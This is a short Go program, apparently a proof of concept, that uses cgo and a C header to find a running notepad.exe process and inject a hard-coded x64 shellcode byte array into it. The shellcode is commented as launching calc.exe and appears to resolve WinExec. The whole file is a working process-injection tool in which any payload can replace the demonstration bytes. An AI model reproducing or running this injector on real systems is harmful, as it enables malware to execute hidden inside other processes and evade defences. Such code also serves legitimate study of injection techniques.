package main

/*
#cgo CFLAGS: -I.
#cgo LDFLAGS: -lkernel32 -luser32
#include "RemoteFuncMapper.h"
*/
import "C"
import (
    "fmt"
    "unsafe"
)

func findProcess(name string) (C.HANDLE, error) {
    cName := C.CString(name)  // Convert Go string to C string and after we Free the C string after use :cool:
    defer C.free(unsafe.Pointer(cName))
    handle := C.find_process(cName)
    if handle == nil {
        return nil, fmt.Errorf("process not found")
    }
    return handle, nil
}

func injectShellcode(hProcess C.HANDLE, shellcode []byte) {
    size := C.size_t(len(shellcode))
    shellcodePtr := unsafe.Pointer(&shellcode[0])
    C.inject_shellcode(hProcess, (*C.uchar)(shellcodePtr), size)
}

func main() {
    // start calc.exe
    shellcode := []byte{
        0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
        0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
        0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
        0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
        0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
        0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
        0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
    }

    processName := "notepad.exe"
    hProcess, err := findProcess(processName)
    if err != nil {
        fmt.Println("Error:", err)
        return
    }

    injectShellcode(hProcess, shellcode)
}
